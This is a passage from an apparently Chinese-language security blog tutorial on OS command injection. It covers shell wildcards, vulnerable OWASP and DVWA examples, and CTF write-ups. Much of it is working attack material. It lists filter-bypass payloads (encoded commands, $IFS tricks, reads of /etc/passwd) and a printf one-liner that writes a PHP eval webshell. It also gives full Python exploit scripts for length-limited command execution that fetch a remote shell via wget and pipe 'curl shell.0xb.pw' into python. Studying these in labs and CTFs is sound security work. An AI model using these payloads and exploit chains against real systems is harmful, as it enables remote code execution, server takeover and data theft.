<td>{str1,str2,&mldr;}</td> <td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td> </tr> <tr> <td>IFS</td> <td>由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td> </tr> <tr> <td>CR</td> <td>由 &lt; enter &gt; 产生</td> </tr> <tr> <td>!</td> <td>执行 history 中的命令</td> </tr> </tbody> </table> <p>以及还有专用字符集</p> <table> <thead> <tr> <th>字符</th> <th>意义</th> </tr> </thead> <tbody> <tr> <td>[:alnum:]</td> <td>任意数字或者字母</td> </tr> <tr> <td>[:alpha:]</td> <td>任意字母</td> </tr> <tr> <td>[:space:]</td> <td>空格</td> </tr> <tr> <td>[:lower:]</td> <td>小写字母</td> </tr> <tr> <td>[:digit:]</td> <td>任意数字</td> </tr> <tr> <td>[:upper:]</td> <td>任意大写字母</td> </tr> <tr> <td>[:cntrl:]</td> <td>控制符</td> </tr> <tr> <td>[:graph:]</td> <td>图形</td> </tr> <tr> <td>[:print:]</td> <td>可打印字符</td> </tr> <tr> <td>[:punct:]</td> <td>标点符号</td> </tr> <tr> <td>[:xdigit:]</td> <td>十六进制数</td> </tr> <tr> <td>[:blank:]</td> <td>空白字符</td> </tr> </tbody> </table> <ul> <li>在使用专属字符集的时候，字符集之外还需要用 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li> <li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li> <li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li> </ul> <h3 id=_21>举个例子</h3> <p>以下事例Example 1-6来源于<code>OWASP</code></p> <h4 id=example-1>Example 1</h4> <p>以下代码是UNIX命令<code>cat</code>的包装器，它将文件的内容打印到标准输出。 它也是可以被注入的：</p> <pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char **argv) {
    char cat[] = &quot;cat &quot;;
    char *command;
    size_t commandLength;

    commandLength = strlen(cat) + strlen(argv[1]) + 1;
    command = (char *) malloc(commandLength);
    strncpy(command, cat, commandLength);
    strncat(command, argv[1], (commandLength - strlen(cat)) );

    system(command);
    return (0);
}

</code></pre> <p>我们编译完之后可以通过以下操作正常使用</p> <pre><code>$ ./catWrapper Story.txt
When last we left our heroes...

</code></pre> <p>但是，如果我们在这行的末尾之后加一个<code>;</code>和另一个命令，那么命令<code>catWrapper</code>执行而且也不会出错。</p> <pre><code>$ ./catWrapper &quot;Story.txt; ls&quot;
When last we left our heroes...
Story.txt               doubFree.c              nullpointer.c
unstosig.c              www*                    a.out*
format.c                strlen.c                useFree*
catWrapper*             misnull.c               strlength.c             useFree.c
commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c

</code></pre> <p>如果将<code>catWrapper</code>设置为具有比标准用户更高的权限级别，则可以使用该更高权限执行任意命令。</p> <h4 id=example-2>Example 2</h4> <p>以下简单程序接受文件名作为命令行参数，并将文件的内容显示给用户。 该程序安装了<code>setuid root</code>，假设原本它旨在用作学习工具，允许系统管理员在培训中检查特权系统文件，而不会让他们修改它们或损坏系统。</p> <pre><code>int main(char* argc, char** argv) {
    char cmd[CMD_MAX] = &quot;/usr/bin/cat &quot;;
    strcat(cmd, argv[1]);
    system(cmd);
}

</code></pre> <p>由于程序以<code>root</code>权限运行，因此对<code>system()</code>的调用也以<code>root</code>权限执行。 如果用户指定标准文件名，则程序调用会按预期工作。 但是，如果攻击者传递<code>1; rm -rf /</code>形式的字符串，无论当前目录是否有<code>1</code>这个文件，都会继续向下执行<code>rm -rf /</code>。</p> <h4 id=example-3>Example 3</h4> <p>本例中，本程序拥有对应的权限，使用环境变量<code>$APPHOME</code>来确定应用程序的安装目录，然后在该目录中执行初始化脚本</p> <pre><code>char* home=getenv(&quot;APPHOME&quot;);
char* cmd=(char*)malloc(strlen(home)+strlen(INITCMD));
if (cmd) {
    strcpy(cmd,home);
    strcat(cmd,INITCMD);
    execl(cmd, NULL);
}

</code></pre> <p>本例前提与<code>Example 2</code>中一样，此示例中的代码允许攻击者使用应用程序的提升权限执行任意命令。在此示例中，攻击者可以修改环境变量<code>$APPHOME</code>通过制定不同的路径以使用含有恶意代码的<code>INITCMD</code>。 由于程序不验证从<code>getenv()</code>读取的值，因此通过控制环境变量，攻击者可以欺骗应用程序运行恶意代码。</p> <p>攻击者使用环境变量来控制程序调用的命令，因此在此示例中环境变量的影响是非常巨大的。</p> <h4 id=example-4>Example 4</h4> <p>下面的代码来自基于<code>Web</code>的<code>CGI</code>实用程序，允许用户更改其密码。 NIS下的密码更新过程包括在<code>/var/yp</code>目录中运行<code>make</code>。 请注意，由于程序更新密码记录，因此已安装<code>setuid root</code>。函数对<code>make</code>调用如下：</p> <pre><code> system(&quot;cd /var/yp &amp;&amp; make &amp;&gt; /dev/null&quot;);

</code></pre> <p>与前面的示例不同，此示例中的命令是没有可控输入的硬编码，因此攻击者无法控制传递给<code>system()</code>的参数。但是，由于程序没有为make指定绝对路径，并且在调用命令之前没有擦除任何环境变量，因此攻击者可以修改其<code>$PATH</code>变量以指向名为<code>make</code>的恶意二进制文件，并从中执行<code>CGI</code>脚本。<code>shell</code>提示。由于该程序已经安装了<code>setuid root</code>，因此攻击者的<code>make</code>版本现在以<code>root</code>权限运行。</p> <p>环境在程序中执行系统命令方面发挥着重要作用。<code>system()</code>和<code>exec()</code>之类的函数使用调用它们的程序环境，因此攻击者有可能影响这些调用的行为。</p> <p>有很多文章会提到<code>Java</code>的<code>Runtime.exec</code>与<code>C</code>的系统功能完全相同。其实不然。虽然两者都允许调用新的程序/进程，但是，<code>C</code>的系统函数将其参数传递给要解析的<code>shell(/bin/sh)</code>，而<code>Runtime.exec</code>尝试将字符串拆分为单词数组，然后使用其余单词执行数组中的第一个单词作为参数。<code>Runtime.exec</code>不会尝试在任何时候调用<code>shell</code>。关键的区别在于<code>shell</code>提供的大部分功能可被恶意利用的点（例如<code>＆</code>，<code>&amp;&amp;</code>，<code>|</code>，<code>||</code>等链接命令，重定向输入和输出）将简单地结束作为传递给第一个命令的参数，可能导致语法错误，或被抛出作为无效参数。</p> <h4 id=example-5>Example 5</h4> <p>以下简单的代码片段易受<code>Unix/Linux</code>平台上的OS命令注入攻击：</p> <pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
     char command[256];

     if(argc != 2) {
          printf(&quot;Error: Please enter a program to time!\n&quot;);
          return -1;
     }

     memset(&amp;command, 0, sizeof(command));

     strcat(command, &quot;time ./&quot;);
     strcat(command, argv[1]);

     system(command);
     return 0;
}

</code></pre> <p>如果这是一个<code>suid</code>二进制文件，请考虑攻击者输入以下内容的情况:<code>ls; cat /etc/passwd</code>。 在Unix环境中，<code>shell</code>命令用分号分隔。 我们现在可以随意执行系统命令！</p> <h4 id=example-6>Example 6</h4> <pre><code>&lt;?php
    print(&quot;Please specify the name of the file to delete&quot;);
    print(&quot;&lt;p&gt;&quot;);
    $file=$_GET['filename'];
    system(&quot;rm $file&quot;);
?&gt;

</code></pre> <p>以下成功攻击的示例：</p> <p>Request:</p> <pre><code>http://127.0.0.1/delete.php?filename=bob.txt;id

</code></pre> <p>Response:</p> <pre><code>Please specify the name of the file to delete

uid=33(www-data) gid=33(www-data) groups=33(www-data) 

</code></pre> <h3 id=_22>再举个例子</h3> <h4 id=_23>?的使用</h4> <pre><code>$ cat /fl??
NUAACTF{56723419231}

$ cat /???/??ss
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
_apt:x:102:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin

</code></pre> <h4 id=_24>[&mldr;]的使用</h4> <p><code>[...]</code>匹配方括号之中的任意一个字符，比如<code>[aeiou]</code>可以匹配五个元音字母。</p> <pre><code># 存在文件 a.txt 和 b.txt 和 c.txt 和 ab.txt
$ ls [ab].txt
a.txt b.txt

$ ls *[ab].txt
ab.txt a.txt b.txt

$ ls [a-c].txt
a.txt b.txt c.txt

$ ls *[a-c].txt
a.txt ab.txt abc.txt b.txt c.txt

</code></pre> <h4 id=_25>{&mldr;}的使用</h4> <p><code>{...}</code> 表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p> <pre><code>$ echo d{a,e,i,u,o}g
dag deg dig dug dog

# 大括号可以嵌套使用
$ echo {j{p,pe}g,png}
jpg jpeg png

# {start..end}匹配连续字符
$ cat /f{0..z}ag
NUAACTF{56723419231}

</code></pre> <p><code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p> <pre><code># 不存在 a.txt 和 b.txt
$ ls [ab].txt
ls: [ab].txt: No such file or directory

$ ls {a,b}.txt
ls: a.txt: No such file or directory
ls: b.txt: No such file or directory

</code></pre> <h4 id=tips>Tips</h4> <p>在使用过程中应该注意：</p> <ol> <li>通配符是先解释，再执行。</li> </ol> <p>Bash 接收到命令以后，发现里面有通配符，会进行通配符扩展，然后再执行命令。</p> <pre><code>$ ls a*.txt
ab.txt

# 上面命令的执行过程是，Bash 先将a*.txt扩展成ab.txt，然后再执行ls ab.txt。

</code></pre> <ol> <li>通配符不匹配，会原样输出。</li> </ol> <p>Bash 扩展通配符的时候，发现不存在匹配的文件，会将通配符原样输出。</p> <pre><code>$ ls *.csv
ls: *.csv: No such file or directory

# 另外，前面已经说过，这条规则对{...}不适用

</code></pre> <ol> <li>只适用于单层路径。</li> </ol> <p>上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，<code>?</code>或<code>*</code>这样的通配符，不能匹配路径分隔符（<code>/</code>）。</p> <p>如果要匹配子目录里面的文件，可以写成下面这样。</p> <pre><code>$ ls */*.txt

</code></pre> <ol> <li>可用于文件名。</li> </ol> <p>Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。</p> <pre><code>$ touch 'fo*'
$ ls
fo*

# 上面代码创建了一个fo*文件，这时*就是文件名的一部分。

</code></pre> <h3 id=_26>运用</h3> <p>以<code>DVWA</code>为例</p> <h4 id=command-injection-low>Command Injection: low</h4> <pre><code>&lt;?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 

?&gt; 

</code></pre> <p>这里没有对<code>ip</code>进行输入检测，所以我们可以使用<code>;cmd</code>的方式进行命令注入。</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610007771.jpg></a></p> <h4 id=command-injection-medium>Command Injection: medium</h4> <pre><code>&lt;?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 
    $substitutions = array( 
        '&amp;&amp;' =&gt; '', 
        ';'  =&gt; '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 

?&gt; 

</code></pre> <p>这里仅仅只是增加了<code>&amp;&amp;</code>与<code>;</code>两个的过滤。然而我们仍然可以使用<code>|</code>来进行绕过。</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007771.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610007771.jpg></a></p> <h4 id=command-injection-high>Command Injection: high</h4> <pre><code>&lt;?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 
    $substitutions = array( 
        '&amp;'  =&gt; '', 
        ';'  =&gt; '', 
        '| ' =&gt; '', 
        '-'  =&gt; '', 
        '$'  =&gt; '', 
        '('  =&gt; '', 
        ')'  =&gt; '', 
        '`'  =&gt; '', 
        '||' =&gt; '', 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
        // Windows 
        $cmd = shell_exec( 'ping ' . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( 'ping -c 4 ' . $target ); 
    } 

    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 

?&gt; 

</code></pre> <p>这里仔细观察，其实<code>|</code>管道符这里有一个空格，所以我们<code>medium</code>的<code>payload</code>还可以继续使用，但是如果真的过滤了<code>|</code>怎么办呢。我们其实还可以抓包加入<code>%0a</code>换行符进行一个绕过。使用<code>127.0.0.1 %0acat /etc/passwd</code>进行绕过</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008189.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610008189.jpg></a></p> <h4 id=command-injection-impossible>Command Injection: impossible</h4> <pre><code>&lt;?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $target = $_REQUEST[ 'ip' ]; 
    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 
    $octet = explode( &quot;.&quot;, $target ); 

    // Check IF each octet is an integer 
    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { 
        // If all 4 octets are int's put the IP back together. 
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 
            // Windows 
            $cmd = shell_exec( 'ping ' . $target ); 
        } 
        else { 
            // *nix 
            $cmd = shell_exec( 'ping -c 4 ' . $target ); 
        } 

        // Feedback for the end user 
        echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
    } 
    else { 
        // Ops. Let the user name theres a mistake 
        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; 

</code></pre> <p>这里对<code>ip</code>以<code>.</code>分组并检查了是否为数字，增加了更多的过滤，所以没办法使用之前那些<code>trick</code>来进行绕过了。</p> <h3 id=_27>常用绕过</h3> <h4 id=_28>命令分隔与执行多条命令</h4> <p>在<code>Unix</code>上:</p> <pre><code>%0a
%0d 
;
&amp;
|
$(shell_command)
`shell_command`
{shell_command,}

</code></pre> <p>在<code>Windows</code>上：</p> <pre><code>%0a
&amp;
|
%1a - 一个神奇的角色，作为.bat文件中的命令分隔符

</code></pre> <p>例如：</p> <pre><code>&lt;?php
$command = 'dir '.$_POST['dir'];
$escaped_command = escapeshellcmd($command);
var_dump($escaped_command);
file_put_contents('out.bat',$escaped_command);
system('out.bat');
?&gt;

</code></pre> <p>可以利用<code>%1a</code>绕过</p> <pre><code>dir=../ %1a whoami

</code></pre> <p>比较老的<code>php</code>版本，如5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。</p> <pre><code>escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;);

//echo 繺;id

</code></pre> <h4 id=_29>空格绕过</h4> <ol> <li>使用<code>&lt;</code>或者<code>&lt;&gt;</code></li> </ol> <pre><code>$ cat&lt;/flag
flag{xxx}

$ cat&lt;&gt;/flag
flag{xxx}

</code></pre> <ol> <li>使用<code>IFS</code>或者</li> </ol> <pre><code>$ cat$IFS$9/flag
flag{xxx}

$ cat${IFS}/flag
flag{xxx}

$ cat$IFS/flag
flag{xxx}

</code></pre> <ol> <li>在<code>url</code>的编码绕过</li> </ol> <p>这里我<code>fuzz</code>了一下，<code>Linux bash</code>可以使用<code>%20(space)</code>、<code>%09(tab)</code>、<code>%3c(&lt;)</code>以及<code>+</code>来绕过</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004461.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610004461.jpg></a> 4. 花括号拓展<code>{OS_COMMAND,ARGUMENT}</code></p> <p>在<code>Linux bash</code>中还可以使用<code>{cat,/etc/passwd}</code>来绕过</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009158.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610009158.jpg></a> 5. 变量控制</p> <pre><code>$ X=$'cat\x20/flag'&amp;&amp;$X
flag{xxx}

$ X=$'cat\x09/flag'&amp;&amp;$X
flag{xxx}

#这里\x3c不可以

</code></pre> <ol> <li>采用<code>[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)</code>绕过</li> </ol> <pre><code>$ c[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)at /fl[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)ag
flag{xxx}

$ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d
id

$ echo i[[email protected]](https://blog.zeddyu.info/cdn-cgi/l/email-protection)d|$0
uid=0(root) gid=0(root) groups=0(root)

</code></pre> <h4 id=_30>黑名单绕过</h4> <ol> <li>采用变量</li> </ol> <pre><code>$ a=l;b=s;$a$b
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

$ a=c;b=at;c=flag;$a$b $c
flag{xxx}

</code></pre> <ol> <li>编码绕过</li> </ol> <pre><code>$ echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash
flag{xxx}

#base64_endcode(&quot;cat /flag&quot;) =&gt; Y2F0IC9mbGFn
#base64可能会出现/

$ echo &quot;636174202f666c6167&quot; | xxd -r -p|bash    #hex
flag{xxx}

$ $(printf &quot;\154\163&quot;)                          #oct
bin  boot  dev  etc  flag  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

$ $(cat /flag)
bash: flag{xxx}: 未找到命令

$ $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;)
flag{xxx}

$ {printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;}|$0
flag{xxx}

#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;
$ {printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;} &gt;&gt; 1.php

</code></pre> <ol> <li>单引号双引号</li> </ol> <pre><code>$ c&quot;a&quot;t /f''l'a'g
flag{xxx}

</code></pre> <ol> <li>反斜线</li> </ol> <pre><code>$ c\a\t /f\l\ag
flag{xxx}

</code></pre> <ol> <li>利用已经存在的资源</li> </ol> <pre><code>$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ echo $PATH| cut -c 1
/

</code></pre> <ol> <li> <p>利用一些已有字符</p> <ul> <li>${PS2} 对应字符 <code>&gt;</code></li> <li>${PS4} 对应字符 <code>+</code></li> <li>${IFS} 对应 内部字段分隔符</li> <li>${9} 对应 空字符串</li> </ul> </li> </ol> <h3 id=_31>举个例子</h3> <h4 id=_32>短命令执行</h4> <p>首先按照前面的<code>&gt;</code>的用法，我们可以知道有标准输出可以输出到文件，所以</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007866.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610007866.jpg></a></p> <p>这里我们有两种构造方式:</p> <ol> <li>只用<code>\</code>分行输入，这个优点是可以不用考虑时间顺序，直接用<code>ls&gt;a</code>输出到<code>a</code>文件，这里可能有一点误解，这里是输入</li> </ol> <pre><code>$ &gt;ec\
ho\
\ 1
#这个方法前面不需要加&gt;，最后用\转义空格

</code></pre> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008039.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610008039.jpg></a></p> <ol> <li>使用<code>\\</code>，这种方法是利用<code>\</code>来拼接字符串，其中前一个<code>\</code>是用来转义后一个<code>\</code>的。这里需要考虑时间顺序，需要逆序来创建文件。</li> </ol> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004356.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610004356.jpg></a></p> <h4 id=example-1_1>Example 1 七字绕过</h4> <p>这里是个p牛出的题</p> <pre><code>&lt;?php
if(strlen($_GET[1])&lt;8){
     echo shell_exec($_GET[1]);
}
?&gt;

</code></pre> <p>我们可以分别通过发送</p> <pre><code>?1=&gt;hp
?1=&gt;ell.p\\
?1=&gt;\ sh\\
?1=&gt;\ -O\\
?1=&gt;com\\
?1=&gt;x.\\
?1=&gt;\ xx\\
?1=&gt;wget\\
?1=ls -t&gt;a
?1=sh a

</code></pre> <p>也就是我们上述的第二个方法写入一个<code>a</code>文件，其中<code>xxx.com</code>可以替换为自己的域名，但是这里要注意，不能以<code>.</code>开头，因为<code>ls -t&gt;a</code>无法将隐藏文件名写入<code>a</code>。</p> <p>贴一下p牛的脚本</p> <pre><code>#!/usr/bin/python3
#-*- coding: utf-8 -*- 

import requests 
def GetShell():
    url = &quot;http://192.168.56.129/shell.php?1=&quot;
    fileNames = [&quot;1.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;] 
    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;
    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 

    for fileName in fileNames:
        createFileUrl = url+&quot;&gt;&quot;+fileName
        print createFileUrl 
        requests.get(createFileUrl)

    getShUrl = url + &quot;ls -t&gt;1&quot;
    print getShUrl
    requests.get(getShUrl)
    getShellUrl = url + &quot;sh 1&quot;
    print getShellUrl
    requests.get(getShellUrl)

    shellUrl = &quot;http://192.168.56.129/1.php&quot;
    response = requests.get(shellUrl)
    if response.status_code == 200:
        print &quot;[*] Get shell !&quot;
    else :
        print &quot;[*] fail!&quot;

if __name__ == &quot;__main__&quot;:
    GetShell()

</code></pre> <h4 id=example-2-hitcon-ctf-2017-babyfirst-revenge>Example 2 五字绕过 [HITCON CTF 2017-BabyFirst Revenge]</h4> <p>源码:</p> <pre><code>&lt;?php
    $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);

</code></pre> <p>这里需要我们注意的是<code>cmd &lt;= 5</code>，所以我们就不能在使用<code>ls -t&gt;a</code>。</p> <p>但是我们还是可以通过比较巧妙的构造来实现<code>ls -t&gt;a</code>这么一个操作的。可以先通过把<code>ls -t&gt;a</code>这样拆分成几段写入到<code>_</code>文件存放。</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008919.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610008919.jpg></a></p> <p>从图中我们就可以看到<code>_</code>里面的内容，第一行无效命令，2-5行因为末尾有<code>\</code>连接字符的存在所以可以连接字符串形成<code>ls -t&gt;g</code>，最后一行执行<code>ls</code>。所以<code>sh _</code>我们可以得到当前目录<code>ls -t&gt;g</code>的效果。达到与<code>Example 1</code>一致的效果，其他步骤与<code>Example 1</code>类似，就不再赘述了。下面给出<code>Orange</code>的<code>exp</code></p> <pre><code>import requests
from time import sleep
from urllib import quote
payload = [
    # generate `ls -t&gt;g` file
    '&gt;ls\\', 
    'ls&gt;_', 
    '&gt;\ \\', 
    '&gt;-t\\', 
    '&gt;\&gt;g', 
    'ls&gt;&gt;_', 
    # generate `curl orange.tw.tw&gt;python`
    # curl shell.0xb.pw|python
    '&gt;on', 
    '&gt;th\\', 
    '&gt;py\\',
    '&gt;\|\\', 
    '&gt;pw\\', 
    '&gt;x.\\',
    '&gt;xx\\', 
    '&gt;l.\\', 
    '&gt;el\\', 
    '&gt;sh\\', 
    '&gt;\ \\', 
    '&gt;rl\\', 
    '&gt;cu\\', 
    # exec
    'sh _', 
    'sh g', 
]
# r = requests.get('http://localhost/tmp/?reset=1')
for i in payload:
    assert len(i) &lt;= 5 
    r = requests.get('http://localhost/tmp/?cmd=' + quote(i) )
    print i
    sleep(0.2)

</code></pre> <p>相关Writeup:</p> <ul> <li><a href=https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/ >HITCON CTF 2017-BabyFirst Revenge-writeup</a></li> <li><a href=https://www.jianshu.com/p/82788b6949c7>HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)</a></li> <li><a href=https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/ >HITCON 2017 CTF BabyFirst Revenge</a></li> <li><a href=https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/ >HITCON CTF 2017 - BabyFirst Revenge (172 pts.)</a></li> <li><a href=https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/ >Hitcon CTF 2017 - Baby Revenge</a></li> <li><a href=https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/ >Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)</a></li> <li><a href=https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/ >HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup</a></li> <li><a href=https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS>BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter</a></li> </ul> <h4 id=example-3-hitcon-2017-babyfirst-revenge-v2>Example 3 四字绕过 [HITCON 2017 BabyFirst Revenge v2]</h4> <p>源码：</p> <pre><code>&lt;?php
    $sandbox = '/www/sandbox/' . md5(&quot;orange&quot; . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
?&gt;

</code></pre> <p>这题相比之前又难了一点，这次是<code>cmd &lt;= 4</code>，但是原理还是一样的。我们要处理的问题还是<code>ls -t&gt;g</code>这么一个问题。然后因为长度限制，如果我们还用<code>\\</code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用<code>&gt;</code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如<code>Exmaple 2</code>中的<code>&gt;\ \\</code>这里就不能再使用了。但是我们这里再提一个<code>trick</code></p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007665.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610007665.jpg></a></p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005128.jpg><img alt src=https://img.vjob.top/imgs/vjob_20190610005128.jpg></a></p> <p><code>*</code> 相当于<code>$(dir *)</code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：</p> <p><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009411.jpg><img alt 